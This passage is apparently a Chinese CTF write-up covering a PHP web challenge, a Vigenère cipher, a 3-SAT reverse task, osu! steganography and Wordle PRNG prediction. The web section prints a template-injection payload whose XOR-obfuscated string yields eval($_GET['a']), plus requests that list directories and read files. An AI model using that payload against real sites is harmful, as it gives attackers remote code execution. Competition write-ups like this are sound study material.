+<p>&#x5229;&#x7528; <code>get_pic.php</code> &#x7684;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x8BFB;&#x4EE3;&#x7801;&#xFF0C;&#x4EE3;&#x7801;&#x8DEF;&#x5F84;&#x662F; <code>/var/www/html</code> &#x8FD9;&#x4E2A;&#x5F88;&#x597D;&#x731C;&#x3002;&#x7136;&#x540E;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x5229;&#x7528; template &#x751F;&#x6210;&#x6587;&#x4EF6;&#x7684;&#x903B;&#x8F91;&#xFF0C;&#x4E0D;&#x96BE;&#x5F04;&#x51FA;&#x4E00;&#x4E2A; PoC&#xFF1A;</p>
+<pre><code>user = pgg)/*
+website = */;phpinfo();/*
+</code></pre><p>&#x95EE;&#x9898;&#x662F; website &#x957F;&#x5EA6;&#x9650;&#x5236;&#x592A;&#x77ED;&#x4E86;&#x3002;&#x8003;&#x8651;&#x5230;&#x628A; payload &#x585E;&#x5230; <code>__PUNC__</code> &#x91CC;&#x9762;&#xFF0C;&#x8FC7;&#x6EE4;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; xor &#x6765;&#x7ED5;&#x8FC7;&#x3002;&#x6700;&#x7EC8; payload &#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>user = pgg)/*
+punc = %27%60~%60%60%29%25%5E%40%40%5C_%23%60%23%5C%28%3A%27%5E%27%05%08%01%0C%01%01%01%07%05%08%04%01%01%01%01%01%01%27
+&#x2191; xor&#x7ED3;&#x679C;&#x662F; eval($_GET[&quot;a&quot;]);
+website = */;eval(__PUNC__);/*
+
+?a=var_dump(scandir(%27/%27));
+?a=var_dump(file_get_contents(%27/flag-xxxxxx%27));
+</code></pre><h2 id="misc-ranma&#xBD;">[misc] Ranma&#xBD;</h2>
+<p>&#x5F88;&#x5BB9;&#x6613;&#x770B;&#x51FA;&#x662F;Vigen&#xE8;re&#x52A0;&#x5BC6;&#xFF08;&#x7279;&#x5F81;&#xFF1A;&#x62C9;&#x4E01;&#x5B57;&#x6BCD;&#x8F6C;&#x6210;&#x62C9;&#x4E01;&#x5B57;&#x6BCD;&#xFF0C;&#x4FDD;&#x6301;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x6BCD;&#x53EF;&#x80FD;&#x88AB;&#x52A0;&#x5BC6;&#x6210;&#x76F8;&#x540C;&#x5B57;&#x6BCD;&#xFF0C;&#x5B57;&#x6BCD;&#x9891;&#x7387;&#x57FA;&#x672C;&#x76F8;&#x7B49;&#xFF09;&#x3002;&#x628A;&#x5BC6;&#x6587;&#x590D;&#x5236;&#x5230;<a href="https://www.dcode.fr/vigenere-cipher&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;Automatic" target="_blank">https://www.dcode.fr/vigenere-cipher&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;Automatic</a> Decryption&#xFF0C;&#x5C31;&#x80FD;&#x770B;&#x5230;&#x660E;&#x6587;&#x3002;</p>
+<p>&#x4F46;&#x662F;&#x6211;&#x6BD4;&#x8D5B;&#x7684;&#x5F53;&#x5929;dcode&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#xFF08;&#x670D;&#x52A1;&#x5668;&#x6545;&#x969C;&#xFF0C;&#x975E;&#x88AB;&#x5899;&#xFF1B;&#x800C;&#x4E14;&#x5199;writeup&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#xFF09;&#x3002;&#x56E0;&#x6B64;&#x7528;<a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx&#x81EA;&#x52A8;&#x5BFB;&#x627E;&#x5BC6;&#x94A5;&#x3002;&#x8BE5;&#x7F51;&#x7AD9;&#x81EA;&#x52A8;&#x627E;&#x7684;&#x5BC6;&#x94A5;&#x6709;&#x4E00;&#x4E9B;&#x5B57;&#x7B26;&#x9519;&#x8BEF;&#xFF0C;&#x56E0;&#x6B64;&#x518D;&#x7528;http://rumkin.com/tools/cipher/vigenere.php&#x89E3;&#x5BC6;&#xFF08;&#x5728;&#x8BE5;&#x7F51;&#x7AD9;&#x4FEE;&#x6539;&#x5BC6;&#x94A5;&#x540E;&#x89E3;&#x5BC6;&#x7ED3;&#x679C;&#x4F1A;&#x81EA;&#x52A8;&#x66F4;&#x65B0;&#xFF09;&#x3002;&#x4EC5;&#x4EC5;&#x6162;&#x4E86;12&#x79D2;&#x4E00;&#x8840;&#x5C31;&#x88AB;&#x522B;&#x7684;&#x961F;&#x62A2;&#x8D70;&#x4E86;&#x3002;" target="_blank">https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx&#x81EA;&#x52A8;&#x5BFB;&#x627E;&#x5BC6;&#x94A5;&#x3002;&#x8BE5;&#x7F51;&#x7AD9;&#x81EA;&#x52A8;&#x627E;&#x7684;&#x5BC6;&#x94A5;&#x6709;&#x4E00;&#x4E9B;&#x5B57;&#x7B26;&#x9519;&#x8BEF;&#xFF0C;&#x56E0;&#x6B64;&#x518D;&#x7528;http://rumkin.com/tools/cipher/vigenere.php&#x89E3;&#x5BC6;&#xFF08;&#x5728;&#x8BE5;&#x7F51;&#x7AD9;&#x4FEE;&#x6539;&#x5BC6;&#x94A5;&#x540E;&#x89E3;&#x5BC6;&#x7ED3;&#x679C;&#x4F1A;&#x81EA;&#x52A8;&#x66F4;&#x65B0;&#xFF09;&#x3002;&#x4EC5;&#x4EC5;&#x6162;&#x4E86;12&#x79D2;&#x4E00;&#x8840;&#x5C31;&#x88AB;&#x522B;&#x7684;&#x961F;&#x62A2;&#x8D70;&#x4E86;&#x3002;</a></p>
+<h2 id="reverse-tales-of-the-arrow">[reverse] Tales of the Arrow</h2>
+<p>&#x9898;&#x610F;&#x662F;&#x7ED9;&#x4E86;136&#x4E2A;&#x5E03;&#x5C14;&#x53D8;&#x91CF;&#xFF08;&#x5BF9;&#x5E94;flag&#x62EC;&#x53F7;&#x91CC;&#x9762;&#x7684;17&#x4E2A;&#x5B57;&#x7B26;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4EA7;&#x751F;15000&#x4E2A;bits[i]=j&#x7684;&#x65AD;&#x8A00;&#xFF0C;&#x5176;&#x4E2D;&#x6BCF;&#x4E09;&#x4E2A;&#x65AD;&#x8A00;&#x4E3A;&#x4E00;&#x7EC4;&#xFF0C;&#x4E00;&#x7EC4;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x4E00;&#x5B9A;&#x662F;&#x6B63;&#x786E;&#x7684;&#xFF0C;&#x5176;&#x4ED6;&#x4E24;&#x4E2A;&#x6709;3/4&#x7684;&#x6982;&#x7387;&#x662F;&#x9519;&#x8BEF;&#x7684;&#x3002;&#x8FD9;&#x53EF;&#x4EE5;&#x8F6C;&#x5316;&#x6210;&#x4E00;&#x4E2A;3-SAT&#x95EE;&#x9898;&#xFF0C;&#x5171;&#x6709;5000&#x4E2A;&#x5B50;&#x53E5;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x9053;&#x9898;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x6C42;&#x89E3;&#x5668;&#x3002;</p>
+<p>&#x6CE8;&#x610F;&#x5230;&#x6BCF;&#x4E2A;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#x7684;&#x6700;&#x9AD8;&#x4F4D;&#x4E00;&#x5B9A;&#x662F;0&#xFF0C;&#x56E0;&#x6B64;&#x6709;17&#x4E2A;bit&#x5DF2;&#x77E5;&#x4E3A;0&#x3002;&#x6211;&#x4EEC;&#x5728;&#x6BCF;&#x4E2A;&#x5B50;&#x53E5;&#x4E2D;&#x5220;&#x9664;&#x6240;&#x6709;&#x4E0D;&#x53EF;&#x80FD;&#x6EE1;&#x8DB3;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x5220;&#x9664;&#x5DF2;&#x7ECF;&#x6EE1;&#x8DB3;&#x7684;&#x5B50;&#x53E5;&#x3002;&#x6B64;&#x65F6;&#x6709;&#x4E9B;&#x5B50;&#x53E5;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E9B;&#x53D8;&#x91CF;&#x503C;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x3002;&#x7136;&#x540E;&#x91CD;&#x590D;&#x4E0A;&#x8FF0;&#x5904;&#x7406;&#x5230;&#x6240;&#x6709;&#x53D8;&#x91CF;&#x503C;&#x90FD;&#x786E;&#x5B9A;&#x4E3A;&#x6B62;&#x3002;</p>
+<pre><code class="lang-python">z=[int(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> open(<span class="hljs-string">r&quot;output.txt&quot;</span>).readlines()[<span class="hljs-number">2</span>:]]
+z1=[set(z[<span class="hljs-number">3</span>*i:<span class="hljs-number">3</span>*i+<span class="hljs-number">3</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5000</span>)]
+A=set(-(<span class="hljs-number">8</span>*i+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>))
+B=set(-i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A)
+<span class="hljs-keyword">while</span> len(z1)&gt;<span class="hljs-number">0</span>:
+    z1=[i-B <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z1 <span class="hljs-keyword">if</span> len(i&amp;A)==<span class="hljs-number">0</span>]
+    A=A|set(list(i)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z1 <span class="hljs-keyword">if</span> len(i)==<span class="hljs-number">1</span>)
+    B=set(-i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A)
+
+b=<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> A <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">137</span>)])
+print(<span class="hljs-string">&apos;&apos;</span>.join(chr(int(<span class="hljs-string">&apos;&apos;</span>.join(x), <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> zip(*[iter(b)]*<span class="hljs-number">8</span>)))
+</code></pre>
+<h2 id="misc-the-ohio-state-university">[misc] The Ohio State University</h2>
+<p>&#x5BB9;&#x6613;&#x627E;&#x5230; <a href="https://osu.ppy.sh/beatmapsets/1235288" target="_blank">&#x539F;&#x8C31;&#x9762;</a>&#xFF0C;&#x4E0B;&#x4E0B;&#x6765;&#x5BF9;&#x6BD4;&#x4E00;&#x4E0B;&#x53D1;&#x73B0;&#x4EE5;&#x4E0B; 4 &#x4E2A;&#x6587;&#x4EF6;&#x4E0D;&#x540C;&#xFF1A;</p>
+<ul>
+<li>BASIC.osu<ul>
+<li>&#x63D0;&#x793A; <code>WAVPassword: MisoilePunch</code>&#xFF0C;&#x8BF4;&#x660E; WAV &#x6587;&#x4EF6;&#x91CC;&#x6709;&#x4E2A;&#x5E26;&#x5BC6;&#x7801;&#x7684;&#x8111;&#x6D1E;&#x9690;&#x5199;</li>
+</ul>
+</li>
+<li>boom.wav<ul>
+<li>&#x652F;&#x6301;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#x9690;&#x5199;&#x5DE5;&#x5177;&#x4E00;&#x5171;&#x5C31;&#x90A3;&#x4E48;&#x51E0;&#x4E2A;&#xFF0C;&#x62FF; SilentEye &#x8BD5;&#x4E86;&#x4E0B;&#x53D1;&#x73B0;&#x4FE1;&#x606F;&#x662F; <code>_TO_O$u_i7s_</code></li>
+</ul>
+</li>
+<li>200813_HEXADIVER.jpg<ul>
+<li>&#x5143;&#x4FE1;&#x606F;&#x91CC;&#x9762;&#x6709;&#x4E2A; <code>pwd: VVelcome!!</code>&#xFF0C;&#x8BF4;&#x660E;&#x53C8;&#x6709;&#x4E2A;&#x5E26;&#x5BC6;&#x7801;&#x7684;&#x8111;&#x6D1E;&#x9690;&#x5199;</li>
+<li>&#x53D1;&#x73B0;&#x662F; steghide&#xFF0C;&#x89E3;&#x51FA;&#x6765; <code>TQLCTF{VVElcOM3</code></li>
+</ul>
+</li>
+<li>VIVID.osu<ul>
+<li>&#x76F4;&#x63A5;&#x6253;&#x5F00;&#x67D0;&#x97F3;&#x4E50;&#x64AD;&#x653E;&#x5668;&#x8FDB;&#x884C;&#x4E00;&#x6CE2; hit the circles&#xFF0C;&#x53D1;&#x73B0;&#x52A0;&#x4E86;&#x6BB5;&#x52B2;&#x7206;&#x5C3E;&#x6740;&#xFF0C;&#x7269;&#x91CF;&#x4E4B;&#x5927;&#x5B8C;&#x5168;&#x4E0D;&#x662F;&#x4EBA;&#x80FD;&#x73A9;&#x7684;&#xFF0C;&#x5EFA;&#x8BAE;&#x51FA;&#x9898;&#x4EBA;&#x5F55;&#x6BB5; AP &#x624B;&#x5143;&#xFF0C;&#x4E0D;&#x7136;&#x6211;&#x4E0D;&#x662F;&#x5F88;&#x8BA4;&#x53EF;</li>
+<li>4 &#x4E2A;&#x8F68;&#x9053;&#x7684; note &#x6309;&#x4E8C;&#x8FDB;&#x5236;&#xFF08;&#x6709; note &#x4E3A; 1&#xFF0C;&#x65E0; note &#x4E3A; 0&#xFF09;ASCII &#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x8BFB;&#xFF0C;&#x89E3;&#x51FA;&#x6765; <code>5HoWtIme}</code></li>
+</ul>
+</li>
+</ul>
+<p>&#x4E09;&#x6BB5;&#x62FC;&#x5728;&#x4E00;&#x8D77;&#x5F97;&#x5230;&#x6700;&#x7EC8; flag&#x3002;</p>
+<p><strong>&#x53E6;&#x5916;&#x4E0B;&#x56DE;&#x80FD;&#x4E0D;&#x80FD;&#x5C11;&#x51FA;&#x70B9;&#x5F3A;&#x884C;&#x731C;&#x9690;&#x5199;&#x5DE5;&#x5177;&#x7684;&#x9898;&#xFF1F;</strong></p>
+<h2 id="misc-wordle">[misc] Wordle</h2>
+<p>&#x89C2;&#x5BDF;&#x53EF;&#x77E5; level0 &#x4E0D;&#x9650;&#x5236;&#x5C1D;&#x8BD5;&#x6B21;&#x6570;&#xFF0C;&#x6545;&#x5373;&#x4F7F;&#x4F9D;&#x6B21;&#x731C;&#x6D4B; valid_words &#x4E5F;&#x53EF;&#x901A;&#x8FC7;&#x3002;&#x53C8;&#x77E5;&#x6BCF;&#x6B21; challenge &#x7531;&#x968F;&#x673A;&#x6570;&#x6307;&#x5B9A;&#xFF0C;&#x8303;&#x56F4;&#x4E3A; <code>len(valid_words) * (2 ** 20)</code> = 4288675840&#xFF0C;&#x5373;&#x4F7F;&#x6539;&#x4E3A; <code>randrange</code> &#x751F;&#x6210;&#x4ECD;&#x7136;&#x6709;&#x8F83;&#x5927;&#x6982;&#x7387;&#x4EA7;&#x51FA;&#x8FDE;&#x7EED;&#x751F;&#x6210;&#x7684; 32bit &#x968F;&#x673A;&#x6570;&#x3002;&#x901A;&#x8FC7;&#x7B54;&#x6848;&#x53EF;&#x77E5; <code>id % len(valid_words)</code>&#xFF0C;&#x518D;&#x548C; round id &#x5F02;&#x6216;&#x8FD8;&#x539F;&#x5F97; <code>id // len(valid_words)</code>&#xFF0C;&#x4E00;&#x4E58;&#x4E00;&#x52A0;&#x5C31;&#x5F97;&#x5230;&#x539F;&#x59CB;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x73A9;&#x4E24;&#x8F6E; level0 &#x641E;&#x51FA;&#x6765; 623 &#x4E2A;&#x5582;&#x5230; randcrack &#x4E2D;&#x5373;&#x53EF;&#x9884;&#x6D4B;&#x540E;&#x7EED;&#x968F;&#x673A;&#x6570;&#x3002;&#x6709;&#x5C11;&#x91CF;&#x51FA;&#x9519;&#x53EF;&#x80FD;&#xFF0C;&#x7528;&#x7B80;&#x5355;&#x7B56;&#x7565;&#x91CD;&#x65B0;&#x5C1D;&#x8BD5;&#x53EF;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x9AD8;&#x6210;&#x529F;&#x6982;&#x7387;&#x3002;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack
+<span class="hljs-keyword">import</span> progressbar
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;allowed_guesses.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
+    allowed_guesses = [x.strip() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f.readlines()]
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;valid_words.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
+    valid_words = [x.strip() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f.readlines()]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetValue</span><span class="hljs-params">(s)</span>:</span>
+    tab = {
+        <span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">8.167</span>,
+        <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1.492</span>,
+        <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2.782</span>,
+        <span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">4.253</span>,
+        <span class="hljs-string">&quot;e&quot;</span>: <span class="hljs-number">12.702</span>,
+        <span class="hljs-string">&quot;f&quot;</span>: <span class="hljs-number">2.228</span>,
+        <span class="hljs-string">&quot;g&quot;</span>: <span class="hljs-number">2.015</span>,
+        <span class="hljs-string">&quot;h&quot;</span>: <span class="hljs-number">6.094</span>,
+        <span class="hljs-string">&quot;i&quot;</span>: <span class="hljs-number">6.966</span>,
+        <span class="hljs-string">&quot;j&quot;</span>: <span class="hljs-number">0.153</span>,
+        <span class="hljs-string">&quot;k&quot;</span>: <span class="hljs-number">0.772</span>,
+        <span class="hljs-string">&quot;l&quot;</span>: <span class="hljs-number">4.025</span>,
+        <span class="hljs-string">&quot;m&quot;</span>: <span class="hljs-number">2.406</span>,
+        <span class="hljs-string">&quot;n&quot;</span>: <span class="hljs-number">6.749</span>,
+        <span class="hljs-string">&quot;o&quot;</span>: <span class="hljs-number">7.507</span>,
+        <span class="hljs-string">&quot;p&quot;</span>: <span class="hljs-number">1.929</span>,
+        <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-number">0.095</span>,
+        <span class="hljs-string">&quot;r&quot;</span>: <span class="hljs-number">5.987</span>,
+        <span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">6.327</span>,
+        <span class="hljs-string">&quot;t&quot;</span>: <span class="hljs-number">9.056</span>,
+        <span class="hljs-string">&quot;u&quot;</span>: <span class="hljs-number">2.758</span>,
+        <span class="hljs-string">&quot;v&quot;</span>: <span class="hljs-number">0.978</span>,
+        <span class="hljs-string">&quot;w&quot;</span>: <span class="hljs-number">2.36</span>,
+        <span class="hljs-string">&quot;x&quot;</span>: <span class="hljs-number">0.15</span>,
+        <span class="hljs-string">&quot;y&quot;</span>: <span class="hljs-number">1.974</span>,
+        <span class="hljs-string">&quot;z&quot;</span>: <span class="hljs-number">0.074</span>,
+    }
+    value = <span class="hljs-number">0</span>
+    st = set(s)
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> st:
+        v = math.log(<span class="hljs-number">100</span> * tab[c])
+        value += v
+    <span class="hljs-keyword">return</span> value
+
+
+original_valid_words = valid_words.copy()
+valid_words.sort(key=<span class="hljs-keyword">lambda</span> s: GetValue(s), reverse=<span class="hljs-keyword">True</span>)
+allowed_guesses.sort(key=<span class="hljs-keyword">lambda</span> s: GetValue(s), reverse=<span class="hljs-keyword">True</span>)
+
+<span class="hljs-comment"># 7: none(white)</span>
+<span class="hljs-comment"># 3: yellow</span>
+<span class="hljs-comment"># 2: green</span>
+NONE = <span class="hljs-number">7</span>
+YELLOW = <span class="hljs-number">3</span>
+GREEN = <span class="hljs-number">2</span>
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Result</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, word, msg)</span>:</span>
+        self.stat = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]
+        self.word = word
+        i = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> msg:
+            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;237&quot;</span>:
+                self.stat[i] = int(c)
+                i += <span class="hljs-number">1</span>
+                <span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span>:
+                    <span class="hljs-keyword">break</span>
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WordleFilter</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>
+        self.tab = [[<span class="hljs-keyword">True</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">26</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>)]
+        self.mustHave = set()
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Test</span><span class="hljs-params">(self, word)</span>:</span>
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+            c = ord(word[i]) - ord(<span class="hljs-string">&quot;a&quot;</span>)
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.tab[i][c]:
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> self.mustHave:
+            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word:
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span><span class="hljs-params">(self, res: Result)</span>:</span>
+        yellowed = []
+        greened = []
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+            c = ord(res.word[i]) - ord(<span class="hljs-string">&quot;a&quot;</span>)
+            <span class="hljs-keyword">if</span> res.stat[i] == NONE:
+                <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> yellowed <span class="hljs-keyword">or</span> c <span class="hljs-keyword">in</span> greened:
+                    <span class="hljs-keyword">continue</span>
+                self.tab[<span class="hljs-number">0</span>][c] = self.tab[<span class="hljs-number">1</span>][c] = self.tab[<span class="hljs-number">2</span>][c] = self.tab[<span class="hljs-number">3</span>][
+                    c
+                ] = self.tab[<span class="hljs-number">4</span>][c] = <span class="hljs-keyword">False</span>
+            <span class="hljs-keyword">elif</span> res.stat[i] == YELLOW:
+                yellowed.append(c)
+                self.tab[i][c] = <span class="hljs-keyword">False</span>
+                self.mustHave.add(res.word[i])
+            <span class="hljs-keyword">elif</span> res.stat[i] == GREEN:
+                greened.append(c)
+                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">26</span>):
+                    self.tab[i][j] = <span class="hljs-keyword">False</span>
+                self.tab[i][c] = <span class="hljs-keyword">True</span>
+            <span class="hljs-keyword">else</span>:
+                print(<span class="hljs-string">&quot;WARNING #0&quot;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FiltFromList</span><span class="hljs-params">(self, lyst)</span>:</span>
+        answers = []
+        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> lyst:
+            <span class="hljs-keyword">if</span> self.Test(word):
+                answers.append(word)
+        <span class="hljs-keyword">return</span> answers
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(first)</span>:</span>
+    wordle_filter = WordleFilter()
+    asked = set()
+
+    <span class="hljs-keyword">if</span> first != <span class="hljs-keyword">None</span>:
+        asked.add(first[<span class="hljs-number">0</span>])
+        wordle_filter.Add(Result(first[<span class="hljs-number">0</span>], first[<span class="hljs-number">1</span>]))
+
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        possibleAnswers = wordle_filter.FiltFromList(valid_words)
+        word = next(
+            filter(<span class="hljs-keyword">lambda</span> x: wordle_filter.Test(x) <span class="hljs-keyword">and</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> asked, possibleAnswers)
+        )
+        r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, bytes(word, <span class="hljs-string">&quot;utf8&quot;</span>))
+        msg = str(r.recvline())
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Wrong&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> msg:
+            <span class="hljs-keyword">break</span>
+        asked.add(word)
+        wordle_filter.Add(Result(word, msg))
+    <span class="hljs-keyword">return</span> word
+
+
+r = remote(<span class="hljs-string">&quot;47.106.102.129&quot;</span>, <span class="hljs-number">46501</span>)
+ints = []
+
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):
+    r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> progressbar.progressbar(range(<span class="hljs-number">512</span>)):
+        round = int(r.recvline().split(<span class="hljs-string">b&quot; &quot;</span>)[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>)
+        word = guess(<span class="hljs-keyword">None</span>)
+        modulo = original_valid_words.index(word)
+        quotient = round ^ modulo
+        ints.append(quotient * len(valid_words) + modulo)
+    r.recvline()
+    r.recvline()
+
+rc = RandCrack()
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">624</span>):
+    rc.submit(ints[i])
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">624</span>, len(ints)):
+    <span class="hljs-keyword">if</span> rc.predict_randrange(<span class="hljs-number">0</span>, len(valid_words) * (<span class="hljs-number">2</span>**<span class="hljs-number">20</span>)) != ints[i]:
+        print(<span class="hljs-string">&quot;Not equal on {}&quot;</span>.format(i))
+
+r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)
+
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> progressbar.progressbar(range(<span class="hljs-number">512</span>)):
+    id = rc.predict_randrange(len(valid_words) * (<span class="hljs-number">2</span>**<span class="hljs-number">20</span>))
+    answer = original_valid_words[id % len(valid_words)]
+    r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, bytes(answer, <span class="hljs-string">&quot;utf8&quot;</span>))
+    msg = str(r.recvline())
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Correct&quot;</span> <span class="hljs-keyword">in</span> msg:
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">else</span>:
+        guess([answer, msg])
+
+print(r.recvline())
+print(r.recvline())
+</code></pre>
+<h2 id="crypto-otp">[crypto] OTP</h2>
+<p>&#x89C2;&#x5BDF;&#x4EE3;&#x7801;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x7684;&#x6838;&#x5FC3;&#x903B;&#x8F91;&#xFF0C;&#x9700;&#x8981;&#x672C;&#x5730;&#x5BF9;&#x52A0;&#x5BC6;&#x7684; flag &#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#x3002;&#x8FD9;&#x4E2A; rebuild &#x770B;&#x7740;&#x5C31;&#x6CA1;&#x7528;&#x3002;
